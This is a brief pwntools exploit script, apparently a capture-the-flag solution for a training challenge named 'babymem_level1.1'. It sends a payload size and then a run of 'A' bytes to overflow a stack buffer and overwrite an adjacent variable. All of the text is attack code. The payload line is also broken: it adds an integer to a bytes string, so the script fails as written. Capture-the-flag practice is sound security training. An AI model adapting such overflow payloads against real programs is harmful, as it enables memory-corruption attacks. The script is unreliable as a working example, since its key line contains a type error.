#!/usr/bin/python3
from pwn import *

# Retrieve the ELF information from the binary and run it
elf = ELF('/challenge/babymem_level1.1')
io = elf.process()

# Set the buffer length as: win_variable_mem_location - buffer_mem_location
# NOTE: the address are obtained by debugging the application with gdb
buffer_length = 108

# Send the payload size to the program.
# The payload size is equal to the buffer length + 2 (which is the variable dimension)
io.recvuntil(b'Payload size: ')
io.sendline(f"{buffer_length + 2}".encode())

# Build the payload to send to the program and send it
PAYLOAD = b'A'*buffer_length + 2
io.recvuntil(b'bytes)!')
io.sendline(PAYLOAD)

# Print the output of the program
print(io.recvall().decode())